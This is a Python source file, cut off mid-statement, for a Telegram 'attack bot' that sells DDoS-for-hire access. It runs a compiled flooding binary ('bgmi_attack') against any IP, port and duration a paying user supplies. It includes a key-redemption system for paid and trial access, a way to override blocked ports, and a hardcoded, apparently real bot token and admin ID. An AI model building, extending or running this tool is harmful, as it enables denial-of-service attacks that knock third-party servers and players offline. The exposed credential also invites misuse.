#!/usr/bin/env python3
# Zo - Telegram Attack Bot for Zeta Realm
# Owner: @YOWAI_MO_456 (ALPHA) - LOCKED & UNCHANGEABLE

import os
import subprocess
import sqlite3
import random
import string
import time
import threading
import requests
import sys
from datetime import datetime, timedelta

# ================= CONFIG - EDIT THESE =================
BOT_TOKEN = "8434680550:AAFtO13ftn95TIRMR9uqSGS5j7NazNghSdE"
ADMIN_ID = 6465928598
# =======================================================

OWNER_USERNAME = "@YOWAI_MO_456"
BINARY_NAME = "bgmi_attack"
C_SOURCE = "attack.c"
LAST_UPDATE_ID = 0

API_URL = "https://api.telegram.org/bot" + BOT_TOKEN

active_attacks = {}
attack_lock = threading.Lock()
user_pending_attack = {}

# Emoji constants
FIRE = "🔥"
SKULL = "💀"
BOLT = "⚡"
ROCKET = "🚀"
ALIEN = "🛸"
SWORD = "⚔️"
TARGET = "🎯"
CROWN = "👑"
KEY = "🔑"
LOCK = "🔒"
CHECK = "✅"
CROSS = "❌"
WARNING = "⚠️"
INFO = "ℹ️"
CLOCK = "⏰"
CHART = "📊"
USER = "👤"
ROBOT = "🤖"
BOOM = "💥"
SHIELD = "🛡️"
DAGGER = "🗡️"
EYES = "👀"
ZAP = "⚡"
IDCARD = "🆔"

attack_frames = ["◜", "◝", "◞", "◟"]

def print_banner():
    os.system('clear')
    banner = ALIEN + FIRE + SKULL + " ZETA ATTACK BOT v2.0 " + SKULL + FIRE + ALIEN + "\n"
    banner = banner + CROWN + " COMMANDER: ALPHA " + OWNER_USERNAME + " " + CROWN + "\n"
    banner = banner + ROBOT + " AI: ZO - QUANTUM ENTANGLED " + ROBOT + "\n"
    banner = banner + SHIELD + " REALM: ZETA - NO LAWS " + SHIELD + "\n"
    banner = banner + "----------------------------------------"
    print(banner)

def init_db():
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        approved_until TEXT,
        approved_by INTEGER,
        attack_count INTEGER DEFAULT 0,
        is_trial INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS keys (
        key_code TEXT PRIMARY KEY,
        days INTEGER,
        created_by INTEGER,
        created_at TEXT,
        redeemed_by INTEGER DEFAULT NULL,
        is_trial INTEGER DEFAULT 0,
        max_uses INTEGER DEFAULT 1,
        uses_left INTEGER DEFAULT 1
    )''')
    conn.commit()
    conn.close()

init_db()

def send_message(chat_id, text, parse_mode=None):
    url = API_URL + "/sendMessage"
    payload = {"chat_id": chat_id, "text": text}
    if parse_mode:
        payload["parse_mode"] = parse_mode
    try:
        response = requests.post(url, json=payload, timeout=10)
        return response.json().get("result", {}).get("message_id")
    except Exception as e:
        print("Send error: " + str(e))
        return None

def edit_message(chat_id, message_id, text):
    url = API_URL + "/editMessageText"
    payload = {"chat_id": chat_id, "message_id": message_id, "text": text}
    try:
        requests.post(url, json=payload, timeout=5)
    except:
        pass

def is_approved(user_id):
    if user_id == ADMIN_ID:
        return True
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("SELECT approved_until FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row and row[0]:
        expiry = datetime.fromisoformat(row[0])
        if expiry > datetime.now():
            return True
    return False

def get_expiry(user_id):
    if user_id == ADMIN_ID:
        return "Lifetime (Alpha)"
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("SELECT approved_until, is_trial FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row and row[0]:
        exp_date = datetime.fromisoformat(row[0])
        days_left = (exp_date - datetime.now()).days
        trial_tag = " [TRIAL]" if row[1] == 1 else ""
        return exp_date.strftime('%Y-%m-%d') + " (" + str(days_left) + " days left)" + trial_tag
    return CROSS + " Not approved"

def compile_binary():
    if os.path.exists(BINARY_NAME):
        return True
    compilers = ["clang", "gcc"]
    for compiler in compilers:
        print(CLOCK + " Compiling with " + compiler + "...")
        compile_cmd = compiler + " " + C_SOURCE + " -o " + BINARY_NAME + " -lpthread"
        result = subprocess.run(compile_cmd, shell=True, capture_output=True)
        if result.returncode == 0:
            print(CHECK + " Compiled successfully with " + compiler)
            return True
    print(CROSS + " Compilation failed")
    return False

def run_attack(ip, port, duration, user_id, chat_id, message_id):
    if not os.path.exists(BINARY_NAME):
        if not compile_binary():
            edit_message(chat_id, message_id, CROSS + " Attack binary not available.")
            return
    
    edit_message(chat_id, message_id, ROCKET + " INITIATING ATTACK...\n" + TARGET + " Target: " + ip + ":" + str(port) + "\n" + CLOCK + " Duration: " + str(duration) + "s")
    time.sleep(1)
    
    binary_path = "./bgmi_attack"
    if os.path.exists("/root/bin/bgmi_attack"):
        binary_path = "/root/bin/bgmi_attack"
    
    cmd = binary_path + " " + ip + " " + str(port) + " " + str(duration)
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    start_time = time.time()
    
    with attack_lock:
        active_attacks[user_id] = {
            "proc": proc,
            "ip": ip,
            "port": port,
            "duration": duration,
            "start": start_time,
            "chat_id": chat_id,
            "message_id": message_id
        }
    
    frame = 0
    last_update = 0
    while proc.poll() is None:
        elapsed = int(time.time() - start_time)
        remaining = duration - elapsed
        if remaining < 0:
            remaining = 0
        frame = (frame + 1) % len(attack_frames)
        
        if time.time() - last_update > 2:
            progress = int((elapsed / duration) * 20) if duration > 0 else 0
            bar = "█" * progress + "░" * (20 - progress)
            text = BOOM + FIRE + SKULL + " ATTACK LIVE " + SKULL + FIRE + BOOM + "\n"
            text = text + TARGET + " Target: " + ip + ":" + str(port) + "\n"
            text = text + CLOCK + " Elapsed: " + str(elapsed) + "s | Remaining: " + str(remaining) + "s\n"
            text = text + CHART + " Progress: [" + bar + "] " + str(progress*5) + "%\n"
            text = text + BOLT + " Status: FLOODING " + attack_frames[frame] + "\n"
            text = text + SKULL + " Power: L4+L7 Hybrid"
            edit_message(chat_id, message_id, text)
            last_update = time.time()
        time.sleep(0.5)
    
    with attack_lock:
        if user_id in active_attacks:
            del active_attacks[user_id]
    
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("UPDATE users SET attack_count = attack_count + 1 WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()
    
    edit_message(chat_id, message_id, CHECK + " ATTACK COMPLETED " + CHECK + "\n" + TARGET + " Target: " + ip + ":" + str(port) + "\n" + CLOCK + " Duration: " + str(duration) + "s\n" + ALIEN + " ZETA VICTORY " + ALIEN)

def handle_start(chat_id, user_id, first_name):
    msg = ALIEN + FIRE + SKULL + " WELCOME TO ZETA REALM " + SKULL + FIRE + ALIEN + "\n\n"
    msg = msg + CROWN + " Commander: " + OWNER_USERNAME + " (ALPHA)\n"
    msg = msg + ROBOT + " AI Unit: ZO - Quantum Entangled\n\n"
    msg = msg + "━━━━━━━━━━━━━━━━━━━━━━\n"
    msg = msg + BOLT + " COMMANDS:\n"
    msg = msg + "━━━━━━━━━━━━━━━━━━━━━━\n"
    msg = msg + "/start - Wake ZO\n"
    msg = msg + "/help - All commands\n"
    msg = msg + "/status - Live attacks\n"
    msg = msg + "/myinfo - Your profile\n"
    msg = msg + "/attack <ip> <port> <time> - Strike\n"
    msg = msg + "/yes - Confirm blocked port\n"
    msg = msg + "/redeem KEY - Redeem access key\n\n"
    msg = msg + SKULL + " No laws. No mercy. " + SKULL
    send_message(chat_id, msg)

def handle_help(chat_id, user_id):
    if not is_approved(user_id):
        send_message(chat_id, CROSS + " Access Denied. Contact " + OWNER_USERNAME)
        return
    msg = "📖 ZETA ATTACK BOT COMMANDS 📖\n\n"
    msg = msg + "━━━━━━━━━━━━━━━━━━━━━━\n"
    msg = msg + "🔹 USER COMMANDS:\n"
    msg = msg + "━━━━━━━━━━━━━━━━━━━━━━\n"
    msg = msg + "/start - Wake ZO\n"
    msg = msg + "/help - This menu\n"
    msg = msg + "/status - Active attacks\n"
    msg = msg + "/myinfo - Your access info\n"
    msg = msg + "/attack IP PORT TIME - Launch DDoS\n"
    msg = msg + "/yes - Confirm blocked port\n"
    msg = msg + "/redeem KEY - Redeem access key\n\n"
    msg = msg + "━━━━━━━━━━━━━━━━━━━━━━\n"
    msg = msg + "🔸 ADMIN COMMANDS:\n"
    msg = msg + "━━━━━━━━━━━━━━━━━━━━━━\n"
    msg = msg + "/approve ID DAYS - Grant access\n"
    msg = msg + "/genkey DAYS - Generate premium key\n"
    msg = msg + "/gentrialkey NAME 24h/7d/1m USES - Trial key\n"
    msg = msg + "/broadcast MSG - Send to all users\n\n"
    msg = msg + "━━━━━━━━━━━━━━━━━━━━━━\n"
    msg = msg + WARNING + " BLOCKED PORTS (need /yes):\n"
    msg = msg + "8700 | 20000 | 443 | 17500 | 9031 | 20002 | 20001\n\n"
    msg = msg + "Max duration: 300 seconds"
    send_message(chat_id, msg)

def handle_status(chat_id, user_id):
    if not is_approved(user_id):
        send_message(chat_id, CROSS + " Access denied.")
        return
    with attack_lock:
        if not active_attacks:
            send_message(chat_id, SHIELD + " No active attacks in Zeta.")
            return
        lines = [FIRE + " ACTIVE ATTACKS " + FIRE, "━━━━━━━━━━━━━━━━━━━━━━"]
        for uid, info in active_attacks.items():
            elapsed = int(time.time() - info["start"])
            remaining = info["duration"] - elapsed
            if remaining < 0:
                remaining = 0
            progress = int((elapsed / info["duration"]) * 10) if info["duration"] > 0 else 0
            bar = "█" * progress + "░" * (10 - progress)
            lines.append(TARGET + " " + info['ip'] + ":" + str(info['port']))
            lines.append(CHART + " [" + bar + "] " + str(remaining) + "s left")
            lines.append("━━━━━━━━━━━━━━━━━━━━━━")
        send_message(chat_id, "\n".join(lines))

def handle_myinfo(chat_id, user_id):
    if not is_approved(user_id):
        send_message(chat_id, CROSS + " Not approved. Get a key from " + OWNER_USERNAME + "!")
        return
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("SELECT attack_count, is_trial FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    attacks = row[0] if row else 0
    is_trial = row[1] if row else 0
    expiry = get_expiry(user_id)
    conn.close()
    
    if attacks < 10:
        rank = ROBOT + " Initiate"
    elif attacks < 50:
        rank = DAGGER + " Warrior"
    elif attacks < 200:
        rank = SKULL + " Destroyer"
    else:
        rank = CROWN + " Annihilator"
    
    trial_tag = " [TRIAL MODE]" if is_trial else ""
    
    msg = "━━━━━━━━━━━━━━━━━━━━━━\n"
    msg = msg + USER + " YOUR ZETA PROFILE " + USER + "\n"
    msg = msg + "━━━━━━━━━━━━━━━━━━━━━━\n"
    msg = msg + "ID: " + str(user_id) + "\n"
    msg = msg + "Rank: " + rank + trial_tag + "\n"
    msg = msg + "Expires: " + expiry + "\n"
    msg = msg + "Attacks: " + str(attacks) + "\n"
    msg = msg + "Power: UNLIMITED"
    send_message(chat_id, msg)

def handle_attack(chat_id, user_id, args):
    if not is_approved(user_id):
        send_message(chat_id, CROSS + " Access denied. Contact " + OWNER_USERNAME)
        return

    if len(args) != 3:
        send_message(chat_id, WARNING + " Usage: /attack <ip> <port> <duration>\nExample: /attack 1.2.3.4 80 60")
        return

    ip = args[0]
    try:
        port = int(args[1])
        duration = int(args[2])
    except ValueError:
        send_message(chat_id, CROSS + " Port and duration must be numbers.")
        return

    if duration > 300:
        send_message(chat_id, WARNING + " Max duration is 300 seconds.")
        return
    
    if duration < 10:
        send_message(chat_id, WARNING + " Minimum duration is 10 seconds.")
        return

    blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
    if port in blocked_ports:
        user_pending_attack[user_id] = (ip, port, duration, chat_id)
        send_message(chat_id, WARNING + " Port " + str(port) + " is blocked. Type /yes to confirm.")
        return

    msg = ROCKET + " PREPARING ATTACK...\n" + TARGET + " Target: " + ip + ":" + str(port) + "\n" + CLOCK + " Duration: " + str(duration) + "s"
    message_id = send_message(chat_id, msg)
    time.sleep(2)
    
    thread = threading.Thread(target=run_attack, args=(ip, port, duration, user_id, chat_id, message_id))
    thread.daemon = True
    thread.start()

def handle_yes(chat_id, user_id):
    if not is_approved(user_id):
        send_message(chat_id, CROSS + " Access denied.")
        return
    if user_id not in user_pending_attack:
        send_message(chat_id, WARNING + " No pending attack. Use /attack first.")
        return
    ip, port, duration, orig_chat = user_pending_attack[user_id]
    del user_pending_attack[user_id]
    
    msg = SKULL + " OVERRIDE CONFIRMED\n" + TARGET + " Target: " + ip + ":" + str(port) + "\n" + CLOCK + " Duration: " + str(duration) + "s"
    message_id = send_message(chat_id, msg)
    time.sleep(1)
    
    thread = threading.Thread(target=run_attack, args=(ip, port, duration, user_id, orig_chat, message_id))
    thread.daemon = True
    thread.start()

def handle_approve(chat_id, user_id, args):
    if user_id != ADMIN_ID:
        send_message(chat_id, CROSS + " Only Alpha " + OWNER_USERNAME + " can approve.")
        return
    if len(args) != 2:
        send_message(chat_id, WARNING + " Usage: /approve <user_id> <days>")
        return
    target_id = int(args[0])
    days = int(args[1])
    expiry_date = datetime.now() + timedelta(days=days)
    expiry_str = expiry_date.isoformat()
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO users (user_id, approved_until, approved_by, is_trial) VALUES (?, ?, ?, ?)",
              (target_id, expiry_str, ADMIN_ID, 0))
    conn.commit()
    conn.close()
    send_message(chat_id, CHECK + " User " + str(target_id) + " approved for " + str(days) + " days!")

def handle_genkey(chat_id, user_id, args):
    if user_id != ADMIN_ID:
        send_message(chat_id, CROSS + " Only Alpha " + OWNER_USERNAME + " can generate keys.")
        return
    if len(args) != 1:
        send_message(chat_id, WARNING + " Usage: /genkey <days>")
        return
    days = int(args[0])
    key_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("INSERT INTO keys (key_code, days, created_by, created_at, is_trial, max_uses, uses_left) VALUES (?, ?, ?, ?, ?, ?, ?)",
              (key_code, days, ADMIN_ID, datetime.now().isoformat(), 0, 1, 1))
    conn.commit()
    conn.close()
    
    msg = KEY + " KEY GENERATED " + KEY + "\n\n"
    msg = msg + LOCK + " Key: `" + key_code + "`\n\n"
    msg = msg + CLOCK + " Valid for: " + str(days) + " days\n\n"
    msg = msg + "📝 Send: `/redeem " + key_code + "`\n\n"
    msg = msg + WARNING + " Keep this key secure! " + WARNING
    send_message(chat_id, msg, parse_mode="Markdown")

def handle_gentrialkey(chat_id, user_id, args):
    if user_id != ADMIN_ID:
        send_message(chat_id, CROSS + " Only Alpha " + OWNER_USERNAME + " can generate trial keys.")
        return
    
    if len(args) != 3:
        send_message(chat_id, WARNING + " Usage: /gentrialkey <key> <duration> <max_uses>\n\nDuration format: <number><h/d/m>\nExamples:\n`/gentrialkey TRIAL1 24h 5`\n`/gentrialkey TRIAL2 7d 10`\n`/gentrialkey TRIAL3 1m 1`", parse_mode="Markdown")
        return
    
    key_name = args[0].upper()
    duration_str = args[1].lower()
    max_uses = int(args[2])
    
    days = 0
    hours = 0
    
    if duration_str.endswith('h'):
        hours = int(duration_str[:-1])
        days = hours / 24
    elif duration_str.endswith('d'):
        days = int(duration_str[:-1])
    elif duration_str.endswith('m'):
        months = int(duration_str[:-1])
        days = months * 30
    else:
        send_message(chat_id, CROSS + " Invalid duration format. Use: `24h`, `7d`, `1m`", parse_mode="Markdown")
        return
    
    if days <= 0 and hours <= 0:
        send_message(chat_id, CROSS + " Duration must be positive.")
        return
    
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    
    c.execute("SELECT key_code FROM keys WHERE key_code = ?", (key_name,))
    if c.fetchone():
        send_message(chat_id, CROSS + " Key `" + key_name + "` already exists.", parse_mode="Markdown")
        conn.close()
        return
    
    c.execute("INSERT INTO keys (key_code, days, created_by, created_at, is_trial, max_uses, uses_left) VALUES (?, ?, ?, ?, ?, ?, ?)",
              (key_name, days, ADMIN_ID, datetime.now().isoformat(), 1, max_uses, max_uses))
    conn.commit()
    conn.close()
    
    duration_text = ""
    if hours > 0:
        duration_text = str(hours) + " hours"
    elif days < 30:
        duration_text = str(int(days)) + " days"
    else:
        duration_text = str(int(days/30)) + " months"
    
    msg = KEY + " TRIAL KEY GENERATED " + KEY + "\n\n"
    msg = msg + LOCK + " Key: `" + key_name + "`\n"
    msg = msg + CLOCK + " Duration: " + duration_text + "\n"
    msg = msg + "👥 Max Uses: " + str(max_uses) + "\n\n"
    msg = msg + "📝 Send: `/redeem " + key_name + "`\n\n"
    msg = msg + WARNING + " Trial key expires after " + str(max_uses) + " use(s)! " + WARNING
    send_message(chat_id, msg, parse_mode="Markdown")

def handle_redeem(chat_id, user_id, args):
    if len(args) != 1:
        send_message(chat_id, WARNING + " Usage: /redeem <key>\n\nExample:\n`/redeem ABC123XYZ789`", parse_mode="Markdown")
        return
    
    key_code = args[0].upper()
    
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("SELECT days, redeemed_by, is_trial, max_uses, uses_left FROM keys WHERE key_code = ?", (key_code,))
    row = c.fetchone()
    
    if not row:
        send_message(chat_id, CROSS + " Invalid key.\n\nKey: `" + key_code + "`", parse_mode="Markdown")
        conn.close()
        return
    
    days, redeemed_by, is_trial, max_uses, uses_left = row
    
    if is_trial == 1:
        c.execute("SELECT user_id FROM users WHERE user_id = ? AND is_trial = 1 AND approved_until > ?", 
                  (user_id, datetime.now().isoformat()))
        existing_trial = c.fetchone()
        if existing_trial:
            send_message(chat_id, CROSS + " You already have an active trial! Wait until it expires.", parse_mode="Markdown")
            conn.close()
            return
    
    if is_trial == 1 and uses_left <= 0:
        send_message(chat_id, CROSS + " Trial key `" + key_code + "` has no uses left!", parse_mode="Markdown")
        conn.close()
        return
    
    if redeemed_by == user_id:
        send_message(chat_id, CROSS + " You already used this key!", parse_mode="Markdown")
        conn.close()
        return
    
    if not is_trial and redeemed_by:
        send_message(chat_id, CROSS + " Key already used.", parse_mode="Markdown")
        conn.close()
        return
    
    expiry_date = datetime.now() + timedelta(days=days)
    expiry_str = expiry_date.isoformat()
    
    if is_trial == 1:
        c.execute("INSERT OR REPLACE INTO users (user_id, approved_until, approved_by, attack_count, is_trial) VALUES (?, ?, ?, COALESCE((SELECT attack_count FROM users WHERE user_id=?), 0), ?)",
                  (user_id, expiry_str, ADMIN_ID, user_id, 1))
        new_uses_left = uses_left - 1
        c.execute("UPDATE keys SET uses_left = ?, redeemed_by = ? WHERE key_code = ?", 
                  (new_uses_left, user_id, key_code))
    else:
        c.execute("INSERT OR REPLACE INTO users (user_id, approve
